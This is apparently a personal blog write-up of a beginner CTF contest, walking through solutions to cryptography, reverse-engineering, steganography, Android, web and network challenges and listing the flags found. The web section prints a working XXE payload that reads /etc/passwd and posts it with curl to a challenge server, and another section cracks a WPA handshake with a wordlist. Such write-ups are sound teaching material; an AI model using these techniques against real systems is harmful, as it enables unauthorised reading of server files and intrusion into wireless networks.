---
title: Writeup for Cipher Combat Beginners 2020
tags: [CTF, Cyber Security, Hackerearth]
style: 
color: 
description: This is the writup for cipher combat ctf held on 22 january 2020. I would be discussing solutions to challenges which I was able to solve.
---

This post contains writeups for the problems of [Cipher Combat Beginners ctf](https://cybersec.hackerearth.com/). In the end, I was able to achieve rank #13 against 1598 who registered for the contest.

## Rotate (Cryptography)

We were given a text file named rotate.txt with content given below.
```
synt = UR{Abj_Lbh_Xabj_Ubj_Gb_Ebgngr}
Abj Fhozvg Guvf.
```

It was [Rot13](https://en.wikipedia.org/wiki/ROT13) which is a letter substitution cipher that replaces a letter with the 13th letter after it, in the alphabet.

Decoding it in the bash.
```bash
$ cat rotate.txt | rot13
flag = HE{Now_You_Know_How_To_Rotate}
Now Submit This.
```

captured the flag!!!

## Reverse Password (Reverse Engineering)

We were given a 64 bit ELF binary file named rev which was confirmed by running `file` command on it
```bash
$ file ./rev
rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4e91e84b5558a16dd5e2acee4801f62ee6819e62, not stripped
```

After executing it in the shell, it asks for the password.
```bash
$ ./rev
Please Enter The Password : aaaaaaaaaaa
Wrong Password! Try Harder..
```

Running it with `ltrace` reveals the password which is being compared and checked with the *strcmp* function.
```bash
$ ltrace ./rev
printf("Please Enter The Password : ")                                                      = 28
__isoc99_scanf(0x55a687c9f915, 0x7fffbc416c41, 0, 0Please Enter The Password : a
)                                        = 1
strcmp("a", "hackerearth")                                                                  = -7
printf("Wrong Password! Try Harder..")                                                      = 28
Wrong Password! Try Harder..+++ exited (status 0) +++
```

Let's check the password *hackerearth* if it works or not.
```bash
$ ltrace -s 1000 ./rev # -s for increasing the maximum string size to print
printf("Please Enter The Password : ")                                                      = 28
__isoc99_scanf(0x564c98b8a915, 0x7ffe255a71a1, 0, 0Please Enter The Password : hackerearth
)                                        = 1
strcmp("hackerearth", "hackerearth")                                                        = 0
printf("\n Accepted"
)                                                                       = 10
printf("\n Flag is: HE{W0rK_H@rD_pl@y_Hard3R}" Accepted
)                                             = 36
__stack_chk_fail(0x564c9a36d283, 125, 0x32bc70261, 0*** stack smashing detected ***: <unknown> terminated
 <no return ...>
--- SIGABRT (Aborted) ---
+++ killed by SIGABRT +++
```

captured the flag!!!

## Welcome (Steganography), QR-Code! (Steganography), and ReadMe (MISC)

In the Welcome challenge, we were given a png file. Opening the file in any image viewer shows the flag.
```
HE{Welcome_to_Cipher_Combat}
```

In the QR-Code! challenge, we were given a QR code. After decoding QR code using `zbarimg`, it gives the flag.
```bash
$ zbarimg ./find.png
QR-Code:HE{Ahhhh!_Y0u_@r3_0N_4!gH7_Tr@cK}
```
captured the flag!!!

A text file was given in ReadMe challenge that contains the flag.
```bash
$ cat readme.txt
Copy This Flag and Submit to get Points.

HE{YoU_are_Absolute_Beginner}

-------------------------------------
```
captured the flag!!!

## Ping (Android)

A apk named ping.apk was given. I didn't run it because of my laziness and don't know what this apk does.

However, I converted it to jar file using dex2jar and we get a ping-dex2jar.jar file.
After, opening it in jdgui and checking MainActivity file, we get this.

{% include elements/figure.html image="https://vikasgola.github.io/assets/2020-01-28-cipher-combat-begginers-PING-challenge.png" caption="jdgui Screenshot" %}

captured the flag!!!

## CrackME (MISC)

A zip file was given named Zipper.zip which asks for password at the extraction time.

After trying *password*  (I mean why not?) as password it gets accepted.
```bash
$ unzip Zipper.zip
Archive:  Zipper.zip
[Zipper.zip] SuperSecret password: 
 extracting: Zipper/SuperSecret
```

Let's see what is in the SuperSecret file.
```bash
$ cat SuperSecret
HE{You_@re_@_Zip_Cracker}
```
captured the flag!!!

## Play and Win (Reverse Engineering)

A ELF binary file was given named TicTacToe.

Running strings on it.
```bash
$ strings TicTacToe | grep "HE" # grep for only printing the line which contains "HE" string
	HE{You_are_a_tic_tac_toe_Ch@mpion}
```

captured the flag!!!

## Three-Words (Reverse Engineering)

A 64 bit ELF binary file was given named threewords.

Running it says:
```bash
$ ./threewords
hint: flag consists of 3 unique words separated by an underscore
```

Decompiling the binary with ghidra and main function looks like this:
```c
undefined8 main(int iParm1,long lParm2)
{
  int iVar1;
  char *__s1;
  
  if (iParm1 == 2) {
    __s1 = getenv("racker");
    if (__s1 == (char *)0x0) {
      __s1 = " ";
    }
    iVar1 = strcmp(__s1,"talkative");
    if ((iVar1 == 0) && (iVar1 = strcmp(*(char **)(lParm2 + 8),"mainstream"), iVar1 == 0)) {
      printf("congrats!! you got your 3 words\n");
    }
    else {
      printf("incorrect!!\n");
    }
  }
  else {
    puts("hint: flag consists of 3 unique words separated by an underscore");
  }
  return 0;
}
```

It's clear that we would have to set an enviorment variable *racker* with value *talkative*, and give a parameter to program which is *mainstream*. So, Let's do that.
```bash
$ racker=talkative ./threewords mainstream
congrats!! you got your 3 words
```

Hence, the flag was `HE{talkative_racker_mainstream}`.

## Lexi Scan (Reverse Engineering)

lexiscan 64 bit ELF binary file was given.

Running it says:
```bash
$ ./lexiscan
usage: ./lexiscan tmfile
```

Looking at the *.rodata section* of binary file in ghidra, shows a suspicious string at address 0049c01f which looks like base64 encoded string.

{% include elements/figure.html image="https://vikasgola.github.io/assets/2020-01-28-cipher-combat-begginers-LEXISCAN-challenge.png" caption="Screenshot from ghidra" %}

Try to decode `SEV7MzRzeV9yM3ZlcnNpbmd9` from base64.
```bash
$ echo "SEV7MzRzeV9yM3Zl" | base64 -d
HE{34sy_r3versing}
```

captured the flag!!!

## Shifter (Reverse Engineering)

A png file which contains call graph with disassembly code of main function of a program was given.

{% include elements/figure.html image="https://vikasgola.github.io/assets/2020-01-28-cipher-combat-begginers-SHIFTER-challenge.png" caption="given image" %}

`rf.bo'b/$ke` string is being pushed to stack in the code which is most likely encrypted flag.
On looking further, variable *var_4h* is being compared to 0xb which is also the length of the encrypted flag. This indicates for loop on encrypted flag. Also in the loop, eax register which was set to loop variable is being added with the characters of encrypted flag on every step.

Implementing it in the python3 and Testing it.
```bash
$ python3
>>> enc = "rf.bo'b/$ke"
>>> flag = ""
>>> for i in range(len(enc)):
...     flag += chr(ord(enc[i]) + i+1)
... 
>>> print(flag)
sh1ft-i7-up
```

Hence, flag was `HE{sh1ft-i7-up}`.

## Lost Cred (Web Application)

A link to the web page was given which says give me username and password. Webpage is currently down and so I am not sure about its exact contain. There was a hint in the source code of webpage which says *i loveeeee xml*. It was hint for xml injection.

Here is the payload.
```xml
<?xml version="1.0"?>
<!DOCTYPE creds [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<creds>
	<user>&xxe;</user>
	<pass>guest</pass>
</creds>
```

After sending it to the webpage, it responds with contents of the passwd file which contains the flag.
```bash
$ curl -i -X POST http://13.232.31.210:8001/index.php --data-binary "@payload.xml" -H "Content-Type: text/xml"
```

## Crack-Network (Network Security)

A packet capture file is given. Opening it in wireshark shows that it contains packets of protocol 802.11 which is used for wireless communication.

On running aircrack-ng, it finds a WPA handshake.
```bash
$ aircrack-ng crack-the-network.cap
Opening crack-the-network.cap
Read 49365 packets.

   #  BSSID              ESSID                     Encryption
   1  D0:D7:83:CC:B8:F3  Honor 8X                  WPA (1 handshake)

Choosing first network as target.

Opening crack-the-network.cap
Please specify a dictionary (option -w).

Quitting aircrack-ng...
```

Cracking the handshake with dictionary *rockyou.txt* which was given as hint in challenge.
```bash
Opening crack-the-network.cap
Reading packets, please wait...

                                 Aircrack-ng

                   [00:05:13] 474356 keys tested (1487.79 k/s)

                          KEY FOUND! [ budaksetan ]

      Master Key     : 71 23 17 4C 2A AF 00 BA E2 8A 41 77 82 00 B5 A7 
                       4D BC BF 09 B8 7E 6A D4 FA 11 51 D9 E0 09 AF 71 

      Transient Key  : 2F 74 6B 35 99 2E 2A A6 72 4D 7A 2E 5F C8 86 2D 
                       F5 AA FA F2 49 8D 1E 4F 41 46 55 7B C7 E5 03 93 
                       F2 9A 3E 1B 3E FA D9 42 CC C9 A0 CF 9B 47 D1 85 
                       68 45 E0 9A FB D0 08 F7 81 CE 7F CA D8 18 3B 1C 
```

Hence, the flag was `HE{budaksetan}`.

## Merge-Me (Network Security)

Multiple cap files was given. Wireshark provides a tool to merge multiple cap files known as *mergecap*.

Opening merged file in wireshark shows packet of ftp protocol. After analyzing the packets, I found a ftp login password which was the flag.

The password was *$up3r$3cr3Tu$s3R* and the flag `HE{$up3r$3cr3Tu$s3R}`.

## Hidden (MISC)

A folder named HIDDEN was given whose directory structure looks like:
```bash
$ find . -type f # dont print empty directories
./.0/10
./.0/2
./.0/6
./.1/16
./.3/12
./.5/14
./.5/9
./.G/5
./.K/15
./.L/17
./.L/18
./.M/11
./.S/19
./.T/7
./.U/3
./.Y/1
./._/13
./._/4
./._/8
```

Here the flag is encoded as *character_of_flag/position_of_character_in_flag*.
The flag was `HE{Y0U_G0T_50M3_5K1LLS}`.